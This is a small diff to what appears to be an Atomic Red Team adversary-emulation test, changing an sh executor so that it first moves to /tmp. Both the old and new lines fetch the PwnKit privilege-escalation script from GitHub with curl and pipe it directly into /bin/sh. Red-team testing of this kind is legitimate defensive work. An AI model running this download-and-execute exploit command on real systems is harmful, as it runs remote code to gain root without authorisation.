@@ -15,4 +15,4 @@ atomic_tests:
   executor:
     name: sh
     command: |-
-      /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+      cd /tmp && /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
